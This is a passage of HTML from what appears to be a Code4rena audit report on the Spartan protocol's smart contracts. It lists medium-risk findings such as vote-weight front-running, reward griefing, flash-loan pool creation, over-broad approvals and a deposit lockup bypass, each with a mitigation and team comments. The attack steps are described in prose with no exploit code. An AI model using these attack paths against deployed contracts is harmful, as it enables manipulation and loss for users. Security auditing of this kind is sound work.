href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/172#issuecomment-894844125\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>On second look, I’ll keep it a medium risk as deployer cannot be purged in all contracts which introduces systemic risk.</p>\n</blockquote>\n<h2 id=\"m-03-improper-access-control-of-claimallformember-allows-anyone-to-reduce-the-weight-of-a-member\" style=\"position:relative;\"><a href=\"#m-03-improper-access-control-of-claimallformember-allows-anyone-to-reduce-the-weight-of-a-member\" aria-label=\"m 03 improper access control of claimallformember allows anyone to reduce the weight of a member permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/235\">[M-03] Improper access control of <code>claimAllForMember</code> allows anyone to reduce the weight of a member</a></h2>\n<p><em>Submitted by shw, also found by 0xRajeev</em></p>\n<p>The <code>claimAllForMember</code> function of <code>Dao</code> is permissionless, allowing anyone to claim the unlocked bonded LP tokens for any member. However, claiming a member’s LP tokens could decrease the member’s weight in the <code>BondVault</code>, thus affecting the member’s votes and rewards in the <code>Dao</code> contract.</p>\n<p>For example, an attacker can intentionally front-run a victim’s <code>voteProposal</code> call to decrease the victim’s vote weight to prevent the proposal from being finalized:</p>\n<ol>\n<li>Supposing the victim’s member weight in the <code>BondVault</code> is 201, the total weight is 300. The victim has some LP tokens claimable from the vault, and if claimed, the victim’s weight will be decreased to 101. To simplify the situation, assuming that the victim’s weight in the <code>DaoVault</code> and the total weight of the <code>DaoVault</code> are both 0.</li>\n<li>The victim wants to vote on the current proposal, which requires the majority consensus. If the victim calls <code>voteProposal</code>, the proposal will be finalized since the victim has the majority weight (201/300 > 66.6%).</li>\n<li>An attacker does not want the proposal to be finalized, so he calls <code>claimAllForMember</code> with the victim as the parameter to intentionally decrease the victim’s weight.</li>\n<li>As a result, the victim’s weight is decreased to 101, and the total weight is decreased to 200. The victim cannot finalize the proposal since he has no majority anymore (101/200 &#x3C; 66.6%).</li>\n</ol>\n<p>Similarly, an attacker can front-run a victim’s <code>harvest</code> call to intentionally decrease the victim’s reward since the amount of reward is calculated based on the victim’s current weight.</p>\n<p>See issue page page for referenced code</p>\n<p>Consider removing the <code>member</code> parameter in the <code>claimAllForMember</code> function and replace all <code>member</code> to <code>msg.sender</code> to allow only the user himself to claim unlocked bonded LP tokens.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/235#issuecomment-886292209\">verifyfirst (Spartan) confirmed and disagreed with severity</a>:</strong></p>\n<blockquote>\n<p>Although a low risk issue, it is valid and the suggested mitigation is correctly proposed.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/235#issuecomment-894858245\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Making this medium risk as no funds are lost.</p>\n</blockquote>\n<h2 id=\"m-04-_deposit-resetting-user-rewards-can-be-used-to-grief-them-and-make-them-loose-rewards-via-depositformember\" style=\"position:relative;\"><a href=\"#m-04-_deposit-resetting-user-rewards-can-be-used-to-grief-them-and-make-them-loose-rewards-via-depositformember\" aria-label=\"m 04 _deposit resetting user rewards can be used to grief them and make them loose rewards via depositformember permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/66\">[M-04] _deposit resetting user rewards can be used to grief them and make them loose rewards via <code>depositForMember</code></a></h2>\n<p><em>Submitted by GalloDaSballo</em></p>\n<p>The function <code>_deposit</code> sets <code>mapMemberSynth_lastTime</code> to a date in the future in <code>synthVault.sol</code> <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L107\">L107</a>.</p>\n<p><code>mapMemberSynth_lastTime</code> is also used to calculate rewards earned. <code>depositForMember</code> allows anyone, to “make a donation” for the member and cause that member to lose all their accrued rewards. This can’t be used for personal gain, but can be used to bring misery to others.</p>\n<p><code>depositForMember</code> (in <code>synthVault.sol</code> on <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L95\">L95</a> can be called by anyone.</p>\n<p>This will set the member and can be continuously exploited to make members never earn any reward.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk12\">mapMemberSynth_lastTime</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_member</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_synth</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">minimumDepositTime</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Record deposit time (scope: member -&gt; synth)</span></span></span></code></pre>\n<p>This is the <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L107\">second submission</a> under the same exploit.</p>\n<p>This can be mitigated by harvesting for the user right before changing <code>mapMemberSynth_lastTime[_member][_synth]</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/66#issuecomment-885457440\">verifyfirst (Spartan) commented</a>:</strong></p>\n<blockquote>\n<p>Suggested mitigation solves the issue.</p>\n</blockquote>\n<h2 id=\"m-05-pools-can-be-created-without-initial-liquidity\" style=\"position:relative;\"><a href=\"#m-05-pools-can-be-created-without-initial-liquidity\" aria-label=\"m 05 pools can be created without initial liquidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/151\">[M-05] Pools can be created without initial liquidity</a></h2>\n<p><em>Submitted by cmichel</em></p>\n<p>The protocol differentiates between public pool creations and private ones (starting without liquidity). However, this is not effective as anyone can just flashloan the required initial pool liquidity, call <code>PoolFactory.createPoolADD</code>, receive the LP tokens in <code>addForMember</code> and withdraw liquidity again.</p>\n<p>Recommend considering burning some initial LP tokens or taking a pool creation fee instead.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/151#issuecomment-886326598\">SamusElderg (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>Whilst we were aware of this (more of a deterrent than prevention) contributors have discussed some methods of locking this liquidity in and making it at least flash loan resistant. For instance, a withdraw-lock (global by pool) for 7 days after the pool’s genesis so that no user can withdraw liquidity until 7 days have passed. There are other ideas floating around too; but regardless this issue will be addressed in some way prior to launch</p>\n</blockquote>\n<h2 id=\"m-06-pool-approveandcall-sets-unnecessary-approval\" style=\"position:relative;\"><a href=\"#m-06-pool-approveandcall-sets-unnecessary-approval\" aria-label=\"m 06 pool approveandcall sets unnecessary approval permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/154\">[M-06] Pool: <code>approveAndCall</code> sets unnecessary approval</a></h2>\n<p><em>Submitted by cmichel</em></p>\n<p>The <code>Pool.approveAndCall</code> function approves the <code>recipient</code> contract with the max value instead of only the required <code>amount</code>.</p>\n<p>For safety, the approval should not be set to the max value, especially if the amount that the contract may use is already known in this call, like this is the case for <code>approveAndCall</code>.</p>\n<p>Recommend only approving <code>amount</code>.</p>\n<h2 id=\"m-07-synth-approveandcall-sets-unnecessary-approval\" style=\"position:relative;\"><a href=\"#m-07-synth-approveandcall-sets-unnecessary-approval\" aria-label=\"m 07 synth approveandcall sets unnecessary approval permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/155\">[M-07] Synth: <code>approveAndCall</code> sets unnecessary approval</a></h2>\n<p><em>Submitted by cmichel</em></p>\n<p>The <code>Synth.approveAndCall</code> function approves the <code>recipient</code> contract with the max value instead of only the required <code>amount</code>.</p>\n<p>For safety, the approval should not be set to the max value, especially if the amount that the contract may use is already known in this call, like this is the case for <code>approveAndCall</code>.</p>\n<p>Recommend only approving <code>amount</code>.</p>\n<h2 id=\"m-08-synthvault-deposit-lockup-bypass\" style=\"position:relative;\"><a href=\"#m-08-synthvault-deposit-lockup-bypass\" aria-label=\"m 08 synthvault deposit lockup bypass permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/167\">[M-08] <code>SynthVault</code> deposit lockup bypass</a></h2>\n<p><em>Submitted by cmichel</em></p>\n<p>The <code>SynthVault.harvestSingle</code> function can be used to mint &#x26; deposit synths without using a lockup. An attacker sends <code>BASE</code> tokens to the pool and then calls <code>harvestSingle</code>. The inner <code>iPOOL(_poolOUT).mintSynth(synth, address(this));</code> call will mint synth tokens to the vault based on the total <code>BASE</code> balance sent to the pool, including the attacker’s previous transfer.\nThey are then credited the entire amount to their <code>weight</code>.</p>\n<p>This essentially acts as a (mint +) deposit without a lock-up period.</p>\n<p>Recommend syncing the pool before sending <code>BASE</code> to it through <code>iRESERVE(_DAO().RESERVE()).grantFunds(reward, _poolOUT);</code> such that any previous <code>BASE</code> transfer is wasted. This way only the actual reward’s weight is increased.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/167#issuecomment-885649798\">verifyfirst (Spartan) disputed</a>:</strong></p>\n<blockquote>\n<p>Although this is true, the attacker is not benefiting from any gain.\nThey are only minting extra synths into the synthVault into their weight.\nIt is no different to - minting and then staking into the vault.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/167#issuecomment-888150116\">SamusElderg (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>@verifyfirst (Spartan) in my opinion this one should be confirmed and the recommended mitigation also makes sense; any attempt to send in BASE by a bad actor can be attributed to the existing LPers instead</p>\n</blockquote>\n<h2 id=\"m-09-in-the-beginning-its-relatively-easy-to-gain-majority-share\" style=\"position:relative;\"><a href=\"#m-09-in-the-beginning-its-relatively-easy-to-gain-majority-share\" aria-label=\"m 09 in the beginning its relatively easy to gain majority share permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/14\">[M-09] In the beginning its relatively easy to gain majority share</a></h2>\n<p><em>Submitted by gpersoon</em></p>\n<p>When the DAO is just deployed it is relatively easy to gain a large (majority) share, by depositing a lot in the <code>DAOVault</code> and/of <code>BONDVault</code>. Then you could submit a proposal and vote it in. Luckily there is a <code>coolOffPeriod</code> of 3 days.\nBut if others are not paying attention in these 3 days you might get your vote passed by voting for it with your majority share.\nThe riskiest proposal would be to replace the DAO (moveDao), because that way you could take over everything.</p>\n<p>Recommend pay attention to the proposals when the DAO is just deployed In <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol\">Dao.sol</a> and making sure you initially have a majority vote.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/14#issuecomment-885428514\">verifyfirst (Spartan) acknowledged</a>:</strong></p>\n<blockquote>\n<p>The recommended mitigation steps were already going to be in place for mainNet including emissions etc.</p>\n</blockquote>\n<h2 id=\"m-10-grantfunds-will-revert-after-a-dao-upgrade\" style=\"position:relative;\"><a href=\"#m-10-grantfunds-will-revert-after-a-dao-upgrade\" aria-label=\"m 10 grantfunds will revert after a dao upgrade permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/17\">[M-10] <code>grantFunds</code> will revert after a DAO upgrade.</a></h2>\n<p><em>Submitted by gpersoon</em></p>\n<p>When the DAO is upgraded via <code>moveDao</code>, it also updates the DAO address in BASE. However it doesn’t update the DAO address in the <code>Reserve.sol</code> contract. This could be done with the function <code>setIncentiveAddresses(..)</code></p>\n<p>Now the next time <code>grantFunds</code> of <code>DAO.sol</code> is called, its tries to call <code>_RESERVE.grantFunds(...)</code></p>\n<p>The <code>grantFunds</code> of <code>Reserve.sol</code> has the modifier <code>onlyGrantor()</code>, which checks the msg<code>.sender</code> == DAO.\nHowever in the mean time, the DAO has been updated and <code>Reserve.sol</code> doesn’t know about it and thus the modifier will not allow access to the function. Thus <code>grantFunds</code> will revert.</p>\n<p><code>Dao.sol</code> <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L452\">L452</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">moveDao</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proposalID</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proposedAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">mapPID_address</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_proposalID</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">// Get the proposed new address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposedAddress</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;!address&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Proposed address must be valid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">DAO</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_proposedAddress</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Change the DAO to point to the new DAO address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">iBASE</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BASE</span><span class=\"mtk1\">).</span><span class=\"mtk11\">changeDAO</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposedAddress</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Change the BASE contract to point to the new DAO address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">daoHasMoved</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Set status of this old DAO</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">completeProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposalID</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Finalise the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">grantFunds</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proposalID</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proposedAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">mapPID_param</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_proposalID</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">// Get the proposed SPARTA grant amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proposedAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">mapPID_address</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_proposalID</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">// Get the proposed SPARTA grant recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposedAmount</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!param&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Proposed grant amount must be valid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposedAddress</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;!address&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Proposed recipient must be valid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_RESERVE</span><span class=\"mtk1\">.</span><span class=\"mtk11\">grantFunds</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposedAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_proposedAddress</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Grant the funds to the recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">completeProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposalID</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Finalise the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><code>Reserve.sol</code> <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/outside-scope/Reserve.sol#L17\">L17</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGrantor</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">DAO</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">ROUTER</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">DEPLOYER</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">LEND</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">SYNTHVAULT</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!DAO&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">grantFunds</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGrantor</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ....</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setIncentiveAddresses</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_router</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_lend</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_synthVault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_Dao</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGrantor</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ROUTER</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_router</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">LEND</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_lend</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">SYNTHVAULT</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_synthVault</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">DAO</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_Dao</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Recommend calling <code>setIncentiveAddresses(..)</code> when a DAO upgrade is done.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/17#issuecomment-885430701\">verifyfirst (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>Non critical, however this will be implemented to future proof the protocol</p>\n</blockquote>\n<h2 id=\"m-11-block-usage-of-addcuratedpool-\" style=\"position:relative;\"><a href=\"#m-11-block-usage-of-addcuratedpool-\" aria-label=\"m 11 block usage of addcuratedpool  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 